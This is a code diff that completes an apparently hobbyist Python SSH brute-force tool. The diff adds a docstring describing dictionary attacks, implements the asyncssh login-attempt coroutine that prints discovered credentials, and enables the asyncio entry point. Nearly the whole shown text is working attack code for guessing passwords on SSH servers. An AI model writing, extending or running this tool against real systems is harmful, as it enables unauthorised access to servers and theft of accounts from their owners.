@@ -1,11 +1,29 @@
+"""Async SSH bruteforce tool
+
+Performs asynchronous dictionary-based bruteforce attacks against SSH servers. 
+Spins up multiple threads, each running an event loop to concurrently try 
+passwords from a wordlist against the target. 
+
+Uses asyncio coroutines and tasks for asynchronous execution. As soon as one 
+task finds the valid password, it cancels the remaining tasks.
+
+Arguments:
+    target: IP address or hostname of the SSH server
+    port: SSH port number (default 22)
+    username: Username to bruteforce
+    wordlist: Path to password wordlist
+    
+"""
+
+
 import argparse 
 from termcolor import colored,cprint 
-import asyncio 
+import asyncio, asyncssh 
 import os
 from datetime import datetime 
 
+
 def get_args():
-    """Function to get command-line arguments""" 
     parser = argparse.ArgumentParser()
 
     parser.add_argument("-n","--name", type=str)
@@ -50,8 +68,14 @@ async def main(hostname, port, username, wordlist):
             
             counter += 1
                     
-def ssh_bruteforce(hostname, username, password, port, found_flag):
-    pass
+async def ssh_bruteforce(hostname, username, password, port, found_flag):
+    try:
+        async with asyncssh.connect(host=hostname, username=username, password=password, port=port) as conn:
+            found_flag.set()
+            print(colored(f"[+] Password Found -> login credential: {username}:{password}@{hostname}" , "green"))
+    except Exception as err:
+        print(
+            f"[Attempt] target {hostname} - login:{username} - password:{password}")
 
 if __name__ == "__main__":
     print(colored("\nAfshin Here!!!","green"))
@@ -80,7 +104,7 @@ if __name__ == "__main__":
     print(colored(
         f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
     print("--------------------------------------------------------\n--------------------------------------------------------")
-    #asyncio.run(main(arguments.target, arguments.port,
-    #            arguments.username, arguments.wordlist))
+    asyncio.run(main(arguments.target, arguments.port,
+                arguments.username, arguments.wordlist))
     
     
